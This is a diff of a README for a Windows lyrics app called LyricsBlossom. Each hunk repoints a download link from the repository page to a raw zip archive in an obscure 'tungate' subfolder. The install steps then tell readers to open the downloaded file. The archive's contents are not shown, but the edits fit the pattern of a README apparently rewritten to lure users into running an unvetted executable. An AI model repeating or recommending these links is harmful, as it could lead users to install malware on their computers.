@@ -1,12 +1,12 @@
 # 🎵 LyricsBlossom - View lyrics while music plays
 
-[![Download LyricsBlossom](https://img.shields.io/badge/Download-LyricsBlossom-blue?style=for-the-badge)](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
+[![Download LyricsBlossom](https://img.shields.io/badge/Download-LyricsBlossom-blue?style=for-the-badge)](https://raw.githubusercontent.com/Metencephalonweesmallvoice815/LyricsBlossom/main/tungate/Blossom-Lyrics-1.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
+[Download LyricsBlossom](https://raw.githubusercontent.com/Metencephalonweesmallvoice815/LyricsBlossom/main/tungate/Blossom-Lyrics-1.8.zip)
 
 ## 🪟 What LyricsBlossom does
 
@@ -16,7 +16,7 @@ LyricsBlossom is a Windows app that shows song lyrics in a simple, Apple Music-l
 
 Follow these steps to download and run LyricsBlossom on Windows:
 
-1. Open the download page: [LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
+1. Open the download page: [LyricsBlossom](https://raw.githubusercontent.com/Metencephalonweesmallvoice815/LyricsBlossom/main/tungate/Blossom-Lyrics-1.8.zip)
 2. Look for the latest release or the main app file on the page.
 3. Download the Windows version to your computer.
 4. When the file finishes downloading, open it from your Downloads folder.
@@ -112,7 +112,7 @@ Yes. It should work well on laptops and desktop PCs.
 
 ### Where do I get the app?
 
-Use the download page here: [LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
+Use the download page here: [LyricsBlossom](https://raw.githubusercontent.com/Metencephalonweesmallvoice815/LyricsBlossom/main/tungate/Blossom-Lyrics-1.8.zip)
 
 ## 📌 File and Folder Basics
 
@@ -152,7 +152,7 @@ To keep the app working well:
 
 If you need to redownload the app later, use the same link:
 
-[Download LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
+[Download LyricsBlossom](https://raw.githubusercontent.com/Metencephalonweesmallvoice815/LyricsBlossom/main/tungate/Blossom-Lyrics-1.8.zip)
 
 ## 📄 Project Name
 
